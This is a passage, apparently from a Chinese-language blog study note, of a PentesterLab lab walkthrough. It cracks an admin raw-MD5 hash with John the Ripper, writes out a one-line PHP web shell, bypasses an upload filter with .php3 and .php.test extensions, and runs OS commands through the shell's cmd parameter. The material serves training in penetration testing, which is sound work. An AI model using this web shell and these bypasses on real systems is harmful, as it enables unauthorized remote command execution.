information...--format=NAME force hash type NAME: DES/BSDI/MD5/BF/AFS/LM/crypt# ...usage information... 不幸的是，这个有效的MD5并不是通过PHP的md5函数M创建的。为了破解这个密码，我们将需要一个支持raw-md5的新版本John。官网提供有支持raw-md5的社区增强版。 现在我们需要给John提供正确的格式信息，我们需要把用户名和密码放在同一行用冒号“：”分开。 1admin:8efe310f9ab3efeae8d410a8e0166eb2 下面的命令行可以用来在破解密码之前检索： 1$ ./john password --format=raw-md5 --wordlist=dico --rules 使用以下选项： password 告诉John什么文件包含密码的哈希值 –format=raw-md5 告诉John密码哈希是raw-md5格式 –wordlist=dico 告诉John使用文件 dico 作为字典 –rules 告诉John尝试遍历每个可用的单词 John输出匹配的哈希数： 1Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)]) 这提供了一个提示，正确的格式。 你可以很快的获取到密码： 123$ ./john password --format=raw-md5 --wordlist=dico --rulesLoaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])P4ssw0rd (admin) 上传WebShell并且执行代码一旦进入了管理页面，下一个目标是找到在操作系统上执行命令的方法。 我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器会给我们提供一种方式，运行PHP代码和命令。 首先我们需要创建一个PHP脚本运行命令。下面是一个简单的和最小的网页木马的源代码： 123&lt;?php system($_GET['cmd']);?&gt; 这个脚本的内容为执行调用系统命令cmd。它需要被保存为一个带.php扩展名的文件。例如 shell.php 可以作为文件名。 我们现在可以使用页面 http://vulnerable/admin/new.php 提供的上传功能来尝试上传这个脚本。 我们可以看到，脚本没有正确上传到服务器上。应用阻止.php扩展名扩展名的文件上传。但是我们可以尝试： .php3 会绕过对 .php 的简单过滤 .php.test 会绕过对 .php 的简单过滤,并且Apache仍然会使用 .php 来解析，因为配置中不存在对 .test 的处理。 现在，我们需要找到这个PHP脚本，管理上传到Web服务器的文件。我们需要确保文件直接用于Web客户端。我们可以访问新上传的图像的页面，看到 &lt;img 标记指向： 12345678&lt;div class=\"content\"&gt; &lt;h2 class=\"title\"&gt;Last picture: Test shell&lt;/h2&gt; &lt;div class=\"inner\" align=\"center\"&gt; &lt;p&gt; &lt;img src=\"admin/uploads/shell.php3\" alt=\"Test shell\" /&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; 你现在可以访问下面的地址并且开始运行命令通过使用cmd参数。例如，访问 http://vulnerable/admin/uploads/shell.php3?cmd=uname 会在操作系统上运行命令 uname 并且返回当前内核( Linux )。其他命令可以用来获取更多信息: uname -a 来获得当前内核的版本； ls 来获取当前目录的内容； … 这个webshell拥有运行PHP脚本的Web服务器相同的权限，例如你不能访问文件 /etc/shadow因为web服务器不能访问这个文件（当你应该尝试假设管理员错误的改变了这个文件的权限）。 每个命令都是运行在一个全新的上下文，独立于前面的命令， 你不能通过运行 cd 和 ls来获取 /etc/ 目录中的内容，因为第二条命令是一个新的上下文。想要获得 /etc/ 目录中的内容，你需要运行 ls /etc/ 。 总结这个练习将教你如何手动检测和利用SQL注入进入管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。 这个练习基于几年前对网站进行渗透测试的结果，但存在这类漏洞的网站今天仍可以在互联网上找到。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]}]}